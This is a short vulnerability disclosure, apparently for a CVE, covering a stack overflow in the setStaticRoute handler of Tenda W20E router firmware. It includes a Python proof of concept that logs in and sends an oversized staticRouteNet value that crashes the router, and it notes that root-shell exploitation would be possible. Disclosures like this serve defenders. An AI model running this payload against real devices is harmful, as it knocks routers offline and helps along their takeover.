# Tenda W20E V15.11.0.6 Stack overflow vulnerability

## Firmware information
- Manufacturer's address：https://www.tenda.com.cn/

- Firmware download address ： https://www.tenda.com.cn/download/detail-2627.html

## Affected version

![](https://github.com/uii1r3i/cve-vuln/blob/main/Tenda/setStaticRoute/imgs/1.png)

## Vulnerability details

![](https://github.com/uii1r3i/cve-vuln/blob/main/Tenda/setStaticRoute/imgs/2.png)

In /gofrom/setStaticRoute, when staticRouteIndex + 1 <= 10, the user can enter staticRouteNet, and staticRouteNet will be spliced into sMibValue by sprintf. It is worth noting that the size is not checked, which leads to a stack overflow vulnerability.

## Poc

```python
import requests

cmd  = b'staticRouteIndex=0&staticRouteNet=' + b'A' * 0x3000

url = b"http://192.168.2.2/login/Auth"
payload = b"http://192.168.2.2/goform/setStaticRoute/?" + cmd

data = {
    "username": "admin",
    "password": "admin",
}

def attack():
    s = requests.session()
    resp = s.post(url=url, data=data)
    print(resp.content)
    resp = s.post(url=payload, data=data)
    print(resp.content)

attack()
```

You can see that the router crashed, and finally you can write an exp to get a root shell
